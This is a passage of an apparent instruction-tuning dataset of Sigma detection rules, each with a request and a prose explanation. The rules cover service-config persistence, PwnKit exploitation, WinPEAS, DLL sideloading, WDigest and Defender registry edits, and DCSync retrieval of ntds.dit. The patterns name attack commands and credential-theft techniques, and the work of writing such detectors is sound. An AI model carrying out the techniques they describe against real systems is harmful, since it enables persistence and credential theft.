    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'config '\n            - 'binpath='\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'failure'\n            - 'command='\n    selection_reg_img:\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'FailureCommand'\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'ImagePath'\n    selection_reg_ext:\n        CommandLine|contains:\n            - '.sh'\n            - '.exe'\n            - '.dll'\n            - '.bin$'\n            - '.bat'\n            - '.cmd'\n            - '.js'\n            - '.msh$'\n            - '.reg$'\n            - '.scr'\n            - '.ps'\n            - '.vb'\n            - '.jar'\n            - '.pl'\n    condition: selection_sc or all of selection_reg_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'config '\n            - 'binpath='\n        - CommandLine|contains|all:\n            - 'sc '\n            - 'failure'\n            - 'command='\n    selection_reg_img:\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'FailureCommand'\n        - CommandLine|contains|all:\n            - 'reg '\n            - 'add '\n            - 'ImagePath'\n    selection_reg_ext:\n        CommandLine|contains:\n            - '.sh'\n            - '.exe'\n            - '.dll'\n            - '.bin$'\n            - '.bat'\n            - '.cmd'\n            - '.js'\n            - '.msh$'\n            - '.reg$'\n            - '.scr'\n            - '.ps'\n            - '.vb'\n            - '.jar'\n            - '.pl'\n    condition: selection_sc or all of selection_reg_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence.",
      "answer": "In order to detect the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence, you should: Monitor Windows process creation logs for specific command-line patterns that indicate such modifications. Look for usage of the 'sc' command in combination with 'config' and 'binpath=', or 'failure' and 'command=' which can be used to change service configurations or set up custom failure actions - a common technique for establishing persistence by ensuring a payload executes under certain conditions. Additionally, watch for the 'reg add' command modifying 'FailureCommand' or 'ImagePath' registry keys, as this also signifies attempts to alter service behavior or execution paths. Also, be vigilant for commands that involve file extensions typically associated with executable and script files, such as '.exe', '.dll', '.bat', '.cmd', '.ps', and others, as these often indicate the introduction or modification of files to carry malicious payloads. This detection focuses on medium-level threats and, while there might be legitimate uses, any matches should be investigated to confirm whether they are part of a potential attack involving persistence mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential PwnKit exploitation CVE-2021-4034 in auth logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auth\ndetection:\n    keywords:\n        '|all':\n            - 'pkexec'\n            - 'The value for environment variable XAUTHORITY contains suscipious content'\n            - '[USER=root] [TTY=/dev/pts/0]'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auth\ndetection:\n    keywords:\n        '|all':\n            - 'pkexec'\n            - 'The value for environment variable XAUTHORITY contains suscipious content'\n            - '[USER=root] [TTY=/dev/pts/0]'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential PwnKit exploitation CVE-2021-4034 in auth logs",
      "answer": "In order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.\nAccounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to prevent adversaries from interrupting the availability of system and network resources by inhibiting access to accounts utilized by legitimate users through actions such as deleting, locking, or manipulating accounts (e.g., changing credentials), you should focus on monitoring PowerShell script logs on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture detailed logging information. Look for scripts that contain the commands `Remove-ADGroupMember` along with both parameters `-Identity ` and `-Members `. This combination indicates an attempt to remove members from Active Directory groups, which could be part of an attack to deny access to certain accounts or resources. Be aware that there may be instances where these commands are used legitimately, though such scenarios are considered unknown false positives. The severity level of this activity is medium, implying that while it may not directly indicate a breach, it is suspicious enough to warrant investigation. Understanding these signs and being proactive in detection can help in mitigating threats aimed at disrupting legitimate user access to network resources and accounts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Remove-ADGroupMember'\n            - '-Identity '\n            - '-Members '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Remove-ADGroupMember'\n            - '-Identity '\n            - '-Members '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users.\nAccounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n",
      "answer": "In order to prevent adversaries from interrupting the availability of system and network resources by inhibiting access to accounts utilized by legitimate users through actions such as deleting, locking, or manipulating accounts (e.g., changing credentials), you should focus on monitoring PowerShell script logs on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture detailed logging information. Look for scripts that contain the commands `Remove-ADGroupMember` along with both parameters `-Identity ` and `-Members `. This combination indicates an attempt to remove members from Active Directory groups, which could be part of an attack to deny access to certain accounts or resources. Be aware that there may be instances where these commands are used legitimately, though such scenarios are considered unknown false positives. The severity level of this activity is medium, implying that while it may not directly indicate a breach, it is suspicious enough to warrant investigation. Understanding these signs and being proactive in detection can help in mitigating threats aimed at disrupting legitimate user access to network resources and accounts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts to escalate privileges on Windows hosts using the WinPEAS script, you should: Monitor for the creation of processes specifically associated with WinPEAS executions on Windows systems. This detection focuses on identifying processes either being created with image names (executable names) that match known variants of WinPEAS, such as 'winPEAS.exe', 'winPEASany.exe', 'winPEASany_ofs.exe', 'winPEASx64.exe', 'winPEASx64_ofs.exe', 'winPEASx86.exe', and 'winPEASx86_ofs.exe', or processes that are initiated with command-line arguments indicative of WinPEAS functionality. These arguments involve searching for installed applications, browser information, interesting event logs, files that may contain credentials, processes, services information, and Windows credentials. Additionally, the rule looks for processes initiated through specific command-line methods, including direct downloads from the official PEASS-ng GitHub repository or with arguments implying a Linux variant of PEAS being used ('-linpeas'). Given the high level of accuracy and the unlikely chance of false positives, any detection based on this rule demands immediate investigation. This approach aims to spot and mitigate the execution of scripts seeking possible privilege escalation points, according to the techniques and tactics outlined in the MITRE ATT&CK framework, focusing on Discovery, Credential Access, and Execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'winPEAS.exe'\n        - Image|endswith:\n            - '\\winPEASany.exe'\n            - '\\winPEASany_ofs.exe'\n            - '\\winPEASx64.exe'\n            - '\\winPEASx64_ofs.exe'\n            - '\\winPEASx86.exe'\n            - '\\winPEASx86_ofs.exe'\n    selection_cli_option:\n        CommandLine|contains:\n            - ' applicationsinfo' # Search installed applications information\n            - ' browserinfo' # Search browser information\n            - ' eventsinfo' # Display interesting events information\n            - ' fileanalysis' # Search specific files that can contains credentials and for regexes inside files\n            - ' filesinfo' # Search generic files that can contains credentials\n            - ' processinfo' # Search processes information\n            - ' servicesinfo' # Search services information\n            - ' windowscreds' # Search windows credentials\n    selection_cli_dl:\n        CommandLine|contains: 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/'\n    selection_cli_specific:\n           - ParentCommandLine|endswith: ' -linpeas'\n           - CommandLine|endswith: ' -linpeas'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'winPEAS.exe'\n        - Image|endswith:\n            - '\\winPEASany.exe'\n            - '\\winPEASany_ofs.exe'\n            - '\\winPEASx64.exe'\n            - '\\winPEASx64_ofs.exe'\n            - '\\winPEASx86.exe'\n            - '\\winPEASx86_ofs.exe'\n    selection_cli_option:\n        CommandLine|contains:\n            - ' applicationsinfo' # Search installed applications information\n            - ' browserinfo' # Search browser information\n            - ' eventsinfo' # Display interesting events information\n            - ' fileanalysis' # Search specific files that can contains credentials and for regexes inside files\n            - ' filesinfo' # Search generic files that can contains credentials\n            - ' processinfo' # Search processes information\n            - ' servicesinfo' # Search services information\n            - ' windowscreds' # Search windows credentials\n    selection_cli_dl:\n        CommandLine|contains: 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/'\n    selection_cli_specific:\n           - ParentCommandLine|endswith: ' -linpeas'\n           - CommandLine|endswith: ' -linpeas'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz",
      "answer": "In order to detect attempts to escalate privileges on Windows hosts using the WinPEAS script, you should: Monitor for the creation of processes specifically associated with WinPEAS executions on Windows systems. This detection focuses on identifying processes either being created with image names (executable names) that match known variants of WinPEAS, such as 'winPEAS.exe', 'winPEASany.exe', 'winPEASany_ofs.exe', 'winPEASx64.exe', 'winPEASx64_ofs.exe', 'winPEASx86.exe', and 'winPEASx86_ofs.exe', or processes that are initiated with command-line arguments indicative of WinPEAS functionality. These arguments involve searching for installed applications, browser information, interesting event logs, files that may contain credentials, processes, services information, and Windows credentials. Additionally, the rule looks for processes initiated through specific command-line methods, including direct downloads from the official PEASS-ng GitHub repository or with arguments implying a Linux variant of PEAS being used ('-linpeas'). Given the high level of accuracy and the unlikely chance of false positives, any detection based on this rule demands immediate investigation. This approach aims to spot and mitigate the execution of scripts seeking possible privilege escalation points, according to the techniques and tactics outlined in the MITRE ATT&CK framework, focusing on Discovery, Credential Access, and Execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a malicious DLL file in the location where the OneDrive or Team applications\nUpon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect creation of a malicious DLL file in the location where the OneDrive or Team applications upon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded, you should: monitor file events within Windows systems specifically focusing on the creation of files. Look for the creation of files named 'iphlpapi.dll' within the '\\AppData\\Local\\Microsoft' directory. This activity is indicative of an attempt to exploit the legitimate loading of the 'iphlpapi.dll' file by either OneDrive or Teams applications for malicious purposes, known as DLL sideloading. Such actions might not have known false positives due to the specific nature of the file and its uncommon directory for legitimate use. The risk level for this detection is considered high, underscoring the importance of monitoring for this activity to prevent potential security breaches or malware execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains|all:\n            - 'iphlpapi.dll'\n            - '\\AppData\\Local\\Microsoft'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains|all:\n            - 'iphlpapi.dll'\n            - '\\AppData\\Local\\Microsoft'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "creation of a malicious DLL file in the location where the OneDrive or Team applications\nUpon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded\n",
      "answer": "In order to detect creation of a malicious DLL file in the location where the OneDrive or Team applications upon execution of the Teams or OneDrive application, the dropped malicious DLL file (\u201ciphlpapi.dll\u201d) is sideloaded, you should: monitor file events within Windows systems specifically focusing on the creation of files. Look for the creation of files named 'iphlpapi.dll' within the '\\AppData\\Local\\Microsoft' directory. This activity is indicative of an attempt to exploit the legitimate loading of the 'iphlpapi.dll' file by either OneDrive or Teams applications for malicious purposes, known as DLL sideloading. Such actions might not have known false positives due to the specific nature of the file and its uncommon directory for legitimate use. The risk level for this detection is considered high, underscoring the importance of monitoring for this activity to prevent potential security breaches or malware execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious program execution in a web service root folder (filter out false positives).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious program execution in a web service root folder (filter out false positives), you should: Monitor for the creation of processes on Windows systems, paying special attention to those initiated from directories commonly associated with web services, such as '\\wwwroot\\', '\\wmpub\\', and '\\htdocs\\'. It's important to exclude processes that are started from less suspicious directories often used for legitimate purposes, like 'bin\\', '\\Tools\\', and '\\SMSComponent\\'. Also, ensure the process wasn't started by 'services.exe' as its parent process to reduce the risk of false positives which might occur from routine operations or the usage of common diagnostic tools that include commands like ping or nslookup. Focus on logging and examining both the command line used to initiate the process and the parent process's command line to more accurately identify and assess potential threats. This approach is tagged with tactics and techniques that typically involve execution and persistence through web servers, aiming to medium level threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\wwwroot\\'\n            - '\\wmpub\\'\n            - '\\htdocs\\'\n    filter:\n        Image|contains:\n            - 'bin\\'\n            - '\\Tools\\'\n            - '\\SMSComponent\\'\n        ParentImage|endswith: '\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|contains:\n            - '\\wwwroot\\'\n            - '\\wmpub\\'\n            - '\\htdocs\\'\n    filter:\n        Image|contains:\n            - 'bin\\'\n            - '\\Tools\\'\n            - '\\SMSComponent\\'\n        ParentImage|endswith: '\\services.exe'\n    condition: selection and not filter\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Various applications\n    - Tools that include ping or nslookup command invocations\nlevel: medium\n",
      "question": "suspicious program execution in a web service root folder (filter out false positives)",
      "answer": "In order to detect a suspicious program execution in a web service root folder (filter out false positives), you should: Monitor for the creation of processes on Windows systems, paying special attention to those initiated from directories commonly associated with web services, such as '\\wwwroot\\', '\\wmpub\\', and '\\htdocs\\'. It's important to exclude processes that are started from less suspicious directories often used for legitimate purposes, like 'bin\\', '\\Tools\\', and '\\SMSComponent\\'. Also, ensure the process wasn't started by 'services.exe' as its parent process to reduce the risk of false positives which might occur from routine operations or the usage of common diagnostic tools that include commands like ping or nslookup. Focus on logging and examining both the command line used to initiate the process and the parent process's command line to more accurately identify and assess potential threats. This approach is tagged with tactics and techniques that typically involve execution and persistence through web servers, aiming to medium level threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an adversary uses the reg.exe utility to add or modify new keys or subkeys.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an adversary uses the reg.exe utility to add or modify new keys or subkeys, you should: monitor the creation of processes on Windows systems, specifically focusing on the execution of the reg.exe utility. Be vigilant for instances where the \"Image\" path ends with '\\reg.exe' or when the \"OriginalFileName\" is exactly 'reg.exe'. Additionally, pay close attention to the command line arguments, especially if they include references to suspicious registry locations such as '\\AppDataLow\\Software\\Microsoft\\', '\\Policies\\Microsoft\\Windows\\OOBE', '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', an alternative casing of '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon', '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest', or '\\Microsoft\\Windows Defender\\'. These locations are commonly targeted for persistent attacks or to modify system configurations maliciously. It is important to evaluate all processes that meet these criteria together (condition: all of selection_*), but also be aware that there are rare cases where legitimate modifications to these registry locations might occur through the command line, which could lead to false positives. This detection strategy is essential for identifying potentially malicious activities associated with tactics and techniques like Persistence, Privilege Escalation, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n",
      "question": "when an adversary uses the reg.exe utility to add or modify new keys or subkeys",
      "answer": "In order to detect when an adversary uses the reg.exe utility to add or modify new keys or subkeys, you should: monitor the creation of processes on Windows systems, specifically focusing on the execution of the reg.exe utility. Be vigilant for instances where the \"Image\" path ends with '\\reg.exe' or when the \"OriginalFileName\" is exactly 'reg.exe'. Additionally, pay close attention to the command line arguments, especially if they include references to suspicious registry locations such as '\\AppDataLow\\Software\\Microsoft\\', '\\Policies\\Microsoft\\Windows\\OOBE', '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', an alternative casing of '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon', '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest', or '\\Microsoft\\Windows Defender\\'. These locations are commonly targeted for persistent attacks or to modify system configurations maliciously. It is important to evaluate all processes that meet these criteria together (condition: all of selection_*), but also be aware that there are rare cases where legitimate modifications to these registry locations might occur through the command line, which could lead to false positives. This detection strategy is essential for identifying potentially malicious activities associated with tactics and techniques like Persistence, Privilege Escalation, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting activity mentioned in Operation Wocao report.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activity mentioned in Operation Wocao report, you should: Monitor Windows security logs for events with an ID of 4799. Specifically, look for events where the targeted username begins with 'Administr' and the name of the caller process ends with '\\checkadmin.exe'. This approach helps identify when there\u2019s an attempt to enumerate local administrators potentially for malicious purposes, aligning with practices reported in Operation Wocao. However, it's important to note that legitimate usage of the tool 'checkadmin.exe' by administrators for checking local group memberships could also trigger this detection, and those instances should be considered false positives. The severity of these detections is considered high due to their potential tie to targeted attack methodologies.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4799\n        TargetUserName|startswith: 'Administr'\n        CallerProcessName|endswith: '\\checkadmin.exe'\n    condition: selection\nfalsepositives:\n    - Administrators that use checkadmin.exe tool to enumerate local administrators\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4799\n        TargetUserName|startswith: 'Administr'\n        CallerProcessName|endswith: '\\checkadmin.exe'\n    condition: selection\nfalsepositives:\n    - Administrators that use checkadmin.exe tool to enumerate local administrators\nlevel: high\n",
      "question": "activity mentioned in Operation Wocao report",
      "answer": "In order to detect activity mentioned in Operation Wocao report, you should: Monitor Windows security logs for events with an ID of 4799. Specifically, look for events where the targeted username begins with 'Administr' and the name of the caller process ends with '\\checkadmin.exe'. This approach helps identify when there\u2019s an attempt to enumerate local administrators potentially for malicious purposes, aligning with practices reported in Operation Wocao. However, it's important to note that legitimate usage of the tool 'checkadmin.exe' by administrators for checking local group memberships could also trigger this detection, and those instances should be considered false positives. The severity of these detections is considered high due to their potential tie to targeted attack methodologies."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g., AppData), you should monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\csc.exe'. This indicates the use of the Microsoft C# Compiler, which could be utilized by an attacker to compile malicious code on the fly. Attention should be given to command lines that contain paths pointing to potentially suspicious folders such as '\\AppData\\' and '\\Windows\\Temp\\', which are commonly used by malware to execute or store payloads due to their less restrictive permissions and general oversight.\n\nHowever, it's also paramount to apply certain filters to reduce false-positive alerts. Processes spawned from 'C:\\Program Files' are typically considered safe, thus any process creation with a parent image starting with this path might be excluded from alerts. Similarly, parent images that end with '\\sdiagnhost.exe', '\\w3wp.exe', or '\\choco.exe', as well as processes initiated with command lines containing '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection', should also be deemed as potentially legitimate activities and excluded from being flagged as suspicious. These filters are crucial for focusing on truly malicious activities and mitigating the noise from legitimate software operations within these directories.\n\nThis approach emphasizes the importance of scrutinizing process creation events where 'csc.exe' is employed in conjunction with questionable directories, while also considering the context of the parent process to distinguish between malicious use and legitimate software activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csc.exe'\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Windows\\Temp\\'\n    filter:\n        - ParentImage|startswith: 'C:\\Program Files'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n        - ParentImage|endswith:\n            - '\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '\\w3wp.exe'        # https://twitter.com/gabriele_pippi/status/1206907900268072962\n            - '\\choco.exe'       # Chocolatey https://chocolatey.org/\n        - ParentCommandLine|contains: '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software from program files - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - Legitimate Microsoft software - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csc.exe'\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Windows\\Temp\\'\n    filter:\n        - ParentImage|startswith: 'C:\\Program Files'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n        - ParentImage|endswith:\n            - '\\sdiagnhost.exe'  # https://twitter.com/gN3mes1s/status/1206874118282448897\n            - '\\w3wp.exe'        # https://twitter.com/gabriele_pippi/status/1206907900268072962\n            - '\\choco.exe'       # Chocolatey https://chocolatey.org/\n        - ParentCommandLine|contains: '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate software from program files - https://twitter.com/gN3mes1s/status/1206874118282448897\n    - Legitimate Microsoft software - https://twitter.com/gabriele_pippi/status/1206907900268072962\nlevel: medium\n",
      "question": "suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)",
      "answer": "In order to detect a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g., AppData), you should monitor for the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\csc.exe'. This indicates the use of the Microsoft C# Compiler, which could be utilized by an attacker to compile malicious code on the fly. Attention should be given to command lines that contain paths pointing to potentially suspicious folders such as '\\AppData\\' and '\\Windows\\Temp\\', which are commonly used by malware to execute or store payloads due to their less restrictive permissions and general oversight.\n\nHowever, it's also paramount to apply certain filters to reduce false-positive alerts. Processes spawned from 'C:\\Program Files' are typically considered safe, thus any process creation with a parent image starting with this path might be excluded from alerts. Similarly, parent images that end with '\\sdiagnhost.exe', '\\w3wp.exe', or '\\choco.exe', as well as processes initiated with command lines containing '\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection', should also be deemed as potentially legitimate activities and excluded from being flagged as suspicious. These filters are crucial for focusing on truly malicious activities and mitigating the noise from legitimate software operations within these directories.\n\nThis approach emphasizes the importance of scrutinizing process creation events where 'csc.exe' is employed in conjunction with questionable directories, while also considering the context of the parent process to distinguish between malicious use and legitimate software activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unauthorized attempts to retrieve the ntds.dit file through synchronization with a legitimate domain controller using the Directory Replication Service Remote Protocol, you should monitor specific indicators within Windows Security logs. Look for events that signify access requests to domain controllers, focusing on Windows Security Event IDs 4624 and 4662 in particular.\n\nEvent ID 4624 should be scrutinized for logons to your domain controllers, listed specifically by their names. This helps to identify any successful authentication attempts that could potentially be used for malicious purposes.\n\nAdditionally, monitor for any IP addresses that correspond to your domain controllers in the event of network-based interactions that could bypass typical authentication mechanisms, aiming to identify direct IP interactions that might signify suspicious activities.\n\nCrucially, focus on Event ID 4662, particularly looking for access requests to objects within the domain controllers specified by their names. This event should be cross-referenced with a list of suspicious target logon IDs, which are identified from previous monitoring (as specified in the initial logon monitoring step). The properties to watch for in these access requests include specific GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' and '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') that are associated with actions on the domain controller that could indicate an attempt to replicate or retrieve sensitive directory data, such as the ntds.dit file.\n\nDetecting these activities involves a nuanced approach where a successful logon event (EventID 4624) to a domain controller that does not subsequently interact through a direct IP address (as checked against a predetermined list of domain controllers' IPs) flags the logon IDs associated with these events. These flagged IDs are then used to monitor for access (EventID 4662) involving the critical GUID properties. If these conditions are met, it indicates a potential unauthorized attempt to access or replicate directory services data, prompting an alert.\n\nBe aware that there are legitimate circumstances where these indicators may be triggered, such as when an administrator is adding a new domain controller to an existing domain. Therefore, it's crucial to analyze the context of alerts and investigate further to differentiate between legitimate administrative activities and malicious actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624\n        ComputerName: '%DomainControllersNamesList%'\n    selection2:\n        IpAddress: '%DomainControllersIpsList%'\n    selection3:\n        EventID: 4662\n        ComputerName: '%DomainControllersNamesList%'\n        SubjectLogonId: '%SuspiciousTargetLogonIdList%'\n        Properties|contains: \n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n    condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert\nfalsepositives:\n    - Legitimate administrator adding new domain controller to already existing domain\nlevel: medium\nstatus: unsupported\n",
    "category": "SigmaFlan",
